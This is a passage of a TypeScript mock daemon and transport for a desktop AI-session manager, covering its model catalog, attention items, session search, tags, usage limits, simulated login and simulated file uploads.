				item.closedUtc = new Date().toISOString();
				this.attentionChanged(s);
				return { dismissed: true };
			}
			case 'catalog.get': return {
				models: [
					{ id: 'default', displayName: 'Default', engine: 'claude', efforts: CLAUDE_EFFORTS },
					{ id: 'claude-opus-5-5', displayName: 'Opus 5.5', provider: 'anthropic', engine: 'claude', efforts: CLAUDE_EFFORTS },
					{ id: 'claude-sonnet-5-5', displayName: 'Sonnet 5.5', provider: 'anthropic', engine: 'claude', efforts: CLAUDE_EFFORTS },
					{ id: 'claude-haiku-5-5', displayName: 'Haiku 5.5', provider: 'anthropic', engine: 'claude', efforts: CLAUDE_EFFORTS },
					{ id: 'claude-opus-5-5-1m', displayName: 'Opus 5.5 with the one million token extended context window (long context)', provider: 'anthropic', engine: 'claude', efforts: CLAUDE_EFFORTS },
					{ id: 'gpt-6.2-luna', displayName: 'GPT-6.2-Luna', provider: 'openAI', engine: 'codex', efforts: [{ id: 'low', description: 'Fast responses' }, { id: 'medium', description: 'Balanced' }] },
					{ id: 'gpt-6.2-sol', displayName: 'GPT-6.2-Sol', provider: 'openAI', engine: 'codex', isDefault: true, upgrade: 'gpt-6.3-sol',
						efforts: [{ id: 'low', description: 'Fast responses' }, { id: 'medium', description: 'Balanced' }, { id: 'high', description: 'Deeper reasoning' }, { id: 'xhigh', description: 'Extra high reasoning' }] },
					{ id: 'qwen3:8b', displayName: 'qwen3:8b', provider: 'ollama', engine: 'claude', efforts: CLAUDE_EFFORTS },
				],
				efforts: ['default', 'max', 'high', 'medium', 'low'],
				mediaPreviewHosts: ['annielartens.online', '*.githubusercontent.com'],
				profiles: [
					{ id: 'default', displayName: SYS_PROFILE, engine: 'claude' }, { id: 'work', displayName: WORK_PROFILE, engine: 'claude' }, { id: 'personal', displayName: 'Personal', engine: 'claude' },
					{ id: 'sys2', displayName: '[Sys] vvinogradoff@gmail.com', engine: 'claude' }, { id: 'long', displayName: 'another.long.name@example-domain.com', engine: 'claude' },
					{ id: 'codex_1', displayName: CHATGPT_PROFILE, engine: 'codex', plan: 'plus' },
				],
			};
			case 'usage.get': return this.usage(String(params.profileId ?? 'default'));
			default: throw new RpcError(-32601, `Method not found: ${method}`);
		}
	}

	/** FR.25.24: a choice sent with a turn is stored on the session (a sticky pick); a GPT model makes it a GPT session (FR.33.4). */
	private applyPick(s: MockSession, params: Record<string, unknown>) {
		const modelId = typeof params.modelId === 'string' ? params.modelId : s.lastUsed.modelId;
		const effort = typeof params.effort === 'string' ? params.effort : s.lastUsed.effort;
		const profileId = typeof params.profileId === 'string' ? params.profileId : s.lastUsed.profileId;
		const profileName = profileId === 'codex_1' ? CHATGPT_PROFILE : profileId === 'work' ? WORK_PROFILE : s.lastUsed.profileName;
		s.lastUsed = { modelId, effort, profileId, profileName };
		s.engine = modelId.startsWith('gpt-') ? 'codex' : undefined;
	}

	private orderedAttention(s: MockSession): AttentionItemDto[] {
		const rank: Record<AttentionKind, number> = { critical: 0, ask: 1, todo: 2, alert: 3, decided: 4 };
		const open = s.attention.filter((a) => a.status === 'open').sort((a, b) => rank[a.kind] - rank[b.kind] || a.number - b.number);
		const closed = s.attention.filter((a) => a.status !== 'open').sort((a, b) => (b.closedUtc ?? '').localeCompare(a.closedUtc ?? ''));
		return [...open, ...closed];
	}

	private attentionChanged(s: MockSession): void {
		this.emit('attention.changed', { nodeId: s.id, summary: this.summary(s) });
		this.touch(s);
	}

	private attentionReply(params: Record<string, unknown>) {
		const s = this.get(params.nodeId);
		const answers = (params.answers as Array<{ itemId: string; text: string; questions?: AttentionQuestionAnswer[] }>) ?? [];
		const answeredIds: string[] = [];
		const skippedIds: string[] = [];
		const lines: string[] = [];
		for (const a of answers) {
			const item = s.attention.find((x) => x.id === a.itemId);
			if (!item || item.status !== 'open') { skippedIds.push(a.itemId); continue; }
			// The real daemon formats questionnaire answers with the shared Core formatter; the mock only needs a readable text.
			const qa = this.formatQuestions(item.questions, a.questions);
			const text = [a.text, ...qa].filter(Boolean).join('\n');
			item.status = 'answered';
			item.answer = text;
			item.closedUtc = new Date().toISOString();
			answeredIds.push(item.id);
			lines.push(`A${item.number} (${item.title}): ${text}`);
		}
		if (answeredIds.length > 0) {
			this.attentionChanged(s);
			this.runTurn(s, lines.join('\n'));
		}
		return { answeredIds, skippedIds, turnStarted: answeredIds.length > 0 };
	}

	private formatQuestions(questions: AttentionQuestionDto[] | undefined, answers: AttentionQuestionAnswer[] | undefined): string[] {
		return (questions ?? []).map((q) => {
			const a = answers?.find((x) => x.number === q.number);
			const shown = q.type === 'multi' ? ((a?.choices ?? []).join(', ') || 'none selected') : (a?.value || 'no answer');
			return `Q${q.number} ${q.text}: ${shown}`;
		});
	}

	private sessionGet(params: Record<string, unknown>) {
		const s = this.get(params.nodeId);
		const dir = this.dirOf(s);
		return {
			id: s.id, name: s.name, directoryId: dir.id, groupId: s.groupId, location: { directoryLabel: dir.label, treePath: this.treePath(s) },
			supervisorId: s.supervisorId, state: this.stateOf(s), tags: s.tags, attention: this.summary(s), lastUsed: s.lastUsed,
			isStreamingMode: s.streaming, entryCount: s.entries.length, epoch: s.epoch,
		};
	}

	private sessionEntries(params: Record<string, unknown>) {
		const s = this.get(params.nodeId);
		const limit = Math.min(Number(params.limit) || FETCH_DEFAULT, FETCH_MAX);
		const all = s.entries;
		let slice: SessionEntryDto[];
		if (typeof params.aroundEntryId === 'string') {
			if (typeof params.afterIndex === 'number' || typeof params.beforeIndex === 'number') throw new RpcError(-32602, 'aroundEntryId cannot be combined with other bounds');
			const m = /^([0-9a-f]{32}):(\d+)$/.exec(params.aroundEntryId);
			if (!m) throw new RpcError(-32602, 'Malformed entry id');
			if (m[1] !== this.fileIdOf(s)) throw new RpcError(-32000, 'Session history changed');
			const ord = Number(m[2]);
			if (ord >= all.length) throw new RpcError(-32000, 'Entry not found');
			const start = Math.max(0, Math.min(ord - Math.floor(limit / 2), all.length - limit));
			slice = all.slice(start, start + limit);
		} else if (typeof params.afterIndex === 'number') slice = all.filter((e) => e.index > (params.afterIndex as number)).slice(0, limit);
		else if (typeof params.beforeIndex === 'number') slice = all.filter((e) => e.index < (params.beforeIndex as number)).slice(-limit);
		else slice = all.slice(-limit);
		return { nodeId: s.id, epoch: s.epoch, total: all.length, fileId: this.fileIdOf(s), entries: slice.map((e) => ({ ...e, entryId: this.entryIdOf(s, e.index) })) };
	}

	private fileRead(params: Record<string, unknown>) {
		const f = this.fileRefs.get(String(params.handle));
		if (!f) throw new RpcError(-32000, 'Unknown file handle');
		const offset = Number(params.offset ?? 0);
		if (!Number.isFinite(offset) || offset < 0) throw new RpcError(-32602, 'Invalid offset');
		return readChunk(f, offset, params.length === undefined ? undefined : Number(params.length));
	}

	/** file.preview: the path must occur in that entry's text (case and slash direction ignored), then the file is looked up by name. */
	private filePreview(params: Record<string, unknown>) {
		const s = this.get(params.nodeId);
		const e = s.entries.find((x) => this.entryIdOf(s, x.index) === params.entryId);
		if (!e) throw new RpcError(-32000, 'Entry not found');
		const norm = (t: string) => t.toLowerCase().replace(/\\/g, '/');
		const path = String(params.path ?? '');
		if (!norm(e.content).includes(norm(path))) throw new RpcError(-32000, "That path does not occur in the entry's text");
		const name = path.split(/[\\/]/).pop() ?? '';
		const f = Object.values(this.files).find((x) => x.name.toLowerCase() === name.toLowerCase());
		if (!f) throw new RpcError(-32000, 'File not found');
		const handle = newId();
		this.fileRefs.set(handle, f);
		return { handle, name: f.name, mime: f.mime, size: sizeOf(f), mtimeUtc: ago(5) };
	}

	private sessionEntry(params: Record<string, unknown>) {
		const s = this.get(params.nodeId);
		if (params.epoch !== s.epoch) throw new RpcError(-32000, 'Session history changed');
		const e = s.entries[Number(params.index)];
		if (!e) throw new RpcError(-32602, 'No such entry');
		const full = s.fullEntries[e.index];
		const withId = { ...e, entryId: this.entryIdOf(s, e.index) };
		return full === undefined ? withId : { ...withId, content: full, truncated: undefined, fullLength: undefined };
	}

	private search(params: Record<string, unknown>) {
		const query = String(params.query ?? '').trim();
		const autoExact = query.toLowerCase().startsWith('https://') || query.length < 8;
		const exact = typeof params.exact === 'boolean' ? params.exact : autoExact;
		if (query === '') return { query, effectiveExact: exact, autoExact, usedFallback: false, matches: [] };
		const words = query.toLowerCase().split(/\s+/);
		const scope = typeof params.scopeNodeId === 'string' ? this.sessions.get(params.scopeNodeId) : undefined;
		const score = (s: MockSession) => {
			let strict = 0;
			let loose = 0;
			for (const e of s.entries) {
				const c = e.content.toLowerCase();
				if (c.includes(query.toLowerCase())) strict++;
				if (words.every((w) => c.includes(w))) loose++;
			}
			const n = s.name.toLowerCase();
			if (n.includes(query.toLowerCase())) { strict++; loose++; }
			return { strict, loose };
		};
		type Row = { id: string; strict: number; loose: number; matchedSelf: boolean; workerIds: string[]; prompt: number };
		const rows: Row[] = [];
		for (const s of this.topLevel()) {
			if (scope && s.dirId !== scope.dirId) continue;
			const own = score(s);
			const workers = this.workersOf(s.id).map((w) => ({ w, sc: score(w) })).filter((x) => x.sc.strict > 0 || x.sc.loose > 0);
			const matchedSelf = own.strict > 0 || own.loose > 0;
			if (!matchedSelf && workers.length === 0) continue;
			const best = [own, ...workers.map((x) => x.sc)].reduce((a, b) => (b.strict > a.strict || (b.strict === a.strict && b.loose > a.loose) ? b : a));
			if (exact && best.strict === 0) continue;
			rows.push({ id: s.id, strict: best.strict, loose: best.loose, matchedSelf, workerIds: workers.map((x) => x.w.id), prompt: Date.parse(this.stateOf(s).lastPromptUtc ?? '') || 0 });
		}
		rows.sort((a, b) => (b.strict > 0 ? 1 : 0) - (a.strict > 0 ? 1 : 0) || b.strict - a.strict || b.loose - a.loose || b.prompt - a.prompt);
		return { query, effectiveExact: exact, autoExact, usedFallback: false, matches: rows.map(({ prompt: _p, ...m }) => m) };
	}

	private createSession(params: Record<string, unknown>) {
		const name = String(params.name ?? '').trim();
		if (!name) throw new RpcError(-32602, 'Name is required');
		const anchor = String(params.anchorId);
		let dir: MockDir | undefined;
		let group: MockGroup | undefined;
		let index = 0;
		const findGroup = (gs: MockGroup[], pred: (g: MockGroup) => boolean): MockGroup | undefined => {
			for (const g of gs) { if (pred(g)) return g; const r = findGroup(g.groups, pred); if (r) return r; }
			return undefined;
		};
		const anchorSession = this.sessions.get(anchor);
		if (anchorSession) {
			const top = anchorSession.supervisorId && this.sessions.has(anchorSession.supervisorId) ? this.sessions.get(anchorSession.supervisorId)! : anchorSession;
			dir = this.dirOf(top);
			group = top.groupId ? findGroup(dir.groups, (g) => g.id === top.groupId) : undefined;
			index = (group ?? dir).sessionIds.indexOf(top.id) + 1;
		} else {
			dir = this.dirs.find((d) => d.id === anchor);
			if (!dir) {
				for (const d of this.dirs) { const g = findGroup(d.groups, (x) => x.id === anchor); if (g) { dir = d; group = g; break; } }
			}
			if (!dir) throw new RpcError(-32000, 'Anchor not found');
			index = (group ?? dir).sessionIds.length; // FR.1.30: a directory or group anchor puts it last
		}
		const s = this.mk({ name, dirId: dir.id, groupId: group?.id, lastActivityMin: null });
		(group ?? dir).sessionIds.splice(index, 0, s.id);
		this.treeVersion++;
		this.emit('tree.changed', { version: this.treeVersion });
		return { session: this.treeSession(s), directoryId: dir.id, groupId: group?.id };
	}

	private pinned(s: MockSession): boolean {
		return s.favorite || s.attention.some((a) => a.status === 'open') || s.hasSchedules;
	}

	private recentList() {
		const rows = this.topLevel()
			.filter((s) => this.pinned(s) || (s.lastActivityMin !== null && s.lastActivityMin <= 1440 && !s.hidden))
			.sort((a, b) => (a.lastActivityMin ?? Number.POSITIVE_INFINITY) - (b.lastActivityMin ?? Number.POSITIVE_INFINITY));
		return {
			serverTimeUtc: new Date().toISOString(),
			sessions: rows.map((s) => ({ id: s.id, name: s.name, directoryLabel: this.dirOf(s).label, state: this.stateOf(s), hasSchedules: s.hasSchedules, pinned: this.pinned(s), canHide: !this.pinned(s) })),
		};
	}

	private recentHide(params: Record<string, unknown>) {
		const s = this.get(params.nodeId);
		if (this.pinned(s)) return { hidden: false };
		s.hidden = true;
		return { hidden: true };
	}

	private tagsSearch(params: Record<string, unknown>) {
		const text = String(params.text ?? '').trim().toLowerCase();
		const selected = (params.selected as TagRefDto[]) ?? [];
		const scope = typeof params.scopeNodeId === 'string' ? this.sessions.get(params.scopeNodeId) : undefined;
		const pool = this.topLevel().concat([...this.sessions.values()].filter((s) => !this.isTopLevel(s))).filter((s) => !scope || s.dirId === scope.dirId);
		const counts = new Map<string, { ref: TagRefDto; n: number }>();
		for (const s of pool) {
			for (const t of s.tags) {
				const key = `${t.kind}:${t.label}`;
				const cur = counts.get(key) ?? { ref: { key, label: t.label, url: t.url, kind: t.kind }, n: 0 };
				cur.n++;
				counts.set(key, cur);
			}
		}
		const selKeys = new Set(selected.map((t) => t.key));
		let chips = [...counts.values()].filter((c) => selKeys.has(c.ref.key) || !text || c.ref.label.toLowerCase().includes(text));
		for (const sel of selected) if (!counts.has(sel.key)) chips.push({ ref: sel, n: 0 });
		chips = chips.sort((a, b) => Number(selKeys.has(b.ref.key)) - Number(selKeys.has(a.ref.key)) || b.n - a.n || a.ref.label.localeCompare(b.ref.label));
		const result: { emptyReason?: string; chips: unknown[]; sessionsEmptyReason?: string; groups: unknown[] } = {
			chips: chips.map((c) => ({ ...c.ref, sessionCount: c.n, selected: selKeys.has(c.ref.key) })), groups: [],
		};
		if (counts.size === 0) result.emptyReason = scope ? 'noTagsScoped' : 'noTagsUnscoped';
		else if (chips.length === 0) result.emptyReason = 'noMatchingTags';
		if (selected.length === 0) { result.sessionsEmptyReason = 'selectTags'; return result; }
		const hits = pool.filter((s) => s.tags.some((t) => selKeys.has(`${t.kind}:${t.label}`)));
		if (hits.length === 0) { result.sessionsEmptyReason = 'noSessions'; return result; }
		hits.sort((a, b) => Number(b.hasDraft) - Number(a.hasDraft) || (a.lastActivityMin ?? 1e9) - (b.lastActivityMin ?? 1e9));
		const byDir = new Map<string, MockSession[]>();
		for (const s of hits) byDir.set(s.dirId, [...(byDir.get(s.dirId) ?? []), s]);
		result.groups = [...byDir.entries()].map(([dirId, list]) => ({
			directoryId: dirId, directoryLabel: this.dirs.find((d) => d.id === dirId)!.label,
			sessions: list.map((s) => ({ id: s.id, name: s.name, state: this.stateOf(s) })),
		}));
		return result;
	}

	private usage(profileId: string): UsageResult {
		if (profileId === 'codex_1') {
			// FR.33.10: Codex's own windows with their labels; the short one ran out of credits.
			return {
				profileId, profileName: CHATGPT_PROFILE, state: 'ok', fetchedAtUtc: new Date().toISOString(), engine: 'codex', exhausted: 'rate_limit_reached',
				fiveHour: { utilization: 100, resetsAtUtc: new Date(Date.now() + 1.2 * 3600_000).toISOString(), isStale: false, label: '5h', durationMinutes: 300, isExhausted: true },
				sevenDay: { utilization: 41, resetsAtUtc: new Date(Date.now() + 3 * 24 * 3600_000).toISOString(), isStale: false, label: '7d', durationMinutes: 10080 },
			};
		}
		const h = profileId === 'personal' ? 12 : profileId === 'work' ? 58 : 37;
		return {
			profileId, profileName: profileId, state: 'ok', fetchedAtUtc: new Date().toISOString(),
			fiveHour: { utilization: h, resetsAtUtc: new Date(Date.now() + 2.5 * 3600_000).toISOString(), isStale: false },
			sevenDay: { utilization: Math.round(h / 3), resetsAtUtc: new Date(Date.now() + 4 * 24 * 3600_000).toISOString(), isStale: false },
		};
	}
}

// ---------------------------------------------------------------------------- transport

const AUTH_KEY = 'tessyn.mock.auth';

export function createMockTransport(): { transport: Transport; daemon: MockDaemon } {
	const daemon = new MockDaemon();
	const delay = <T,>(f: () => T): Promise<T> => new Promise((resolve, reject) => {
		window.setTimeout(() => { try { resolve(f()); } catch (e) { reject(e); } }, LATENCY_MS);
	});
	const transport: Transport = {
		rpc: (method, params) => delay(() => daemon.handle(method, (params ?? {}) as Record<string, unknown>)),
		login: (email, password) => delay<LoginResult>(() => {
			if (password === 'throttle') throw new LoginError(429, 'Too many attempts', 120);
			if (password === 'wrong' || !email) throw new LoginError(401, 'Invalid email or password');
			sessionStorage.setItem(AUTH_KEY, email);
			return { email };
		}),
		logout: () => delay(() => { sessionStorage.removeItem(AUTH_KEY); }),
		me: () => delay(() => { const e = sessionStorage.getItem(AUTH_KEY); return e ? { email: e } : null; }),
		upload(nodeId, file, onProgress): UploadHandle {
			// ~600 ms in 6 steps so the progress bar is observable; "fail.bin" answers 500 { error }.
			let timer = 0;
			let rejectFn: (e: Error) => void = () => {};
			const promise = new Promise<AttachmentResult>((resolve, reject) => {
				rejectFn = reject;
				let step = 0;
				timer = window.setInterval(() => {
					step++;
					onProgress(step / 6);
					if (step < 6) return;
					window.clearInterval(timer);
					if (file.name === 'fail.bin') { reject(new UploadError(500, 'The daemon could not store the file')); return; }
					resolve({
						attachmentId: newId(), name: file.name, size: file.size, mime: file.type || 'application/octet-stream',
						path: `C:\\Users\\mock\\AppData\\Roaming\\TessynDesktop\\attachments\\${nodeId.slice(0, 8)}\\20261115-101500-${file.name}`,
					});
				}, 100);
			});
			return { promise, abort: () => { window.clearInterval(timer); rejectFn(new UploadError(-1, 'Upload cancelled')); } };
		},
		openEvents(handlers: EventSourceHandlers): EventSourceHandle {
			let closed = false;
			const off = daemon.subscribe((f) => { if (!closed) handlers.onFrame(f); });
			window.setTimeout(() => { if (!closed) handlers.onFrame({ method: 'link.status', params: { online: daemon.online, since: new Date().toISOString() } }); }, 0);
			return { close: () => { closed = true; off(); }, get closed() { return closed; } };
		},
	};
	return { transport, daemon };
}
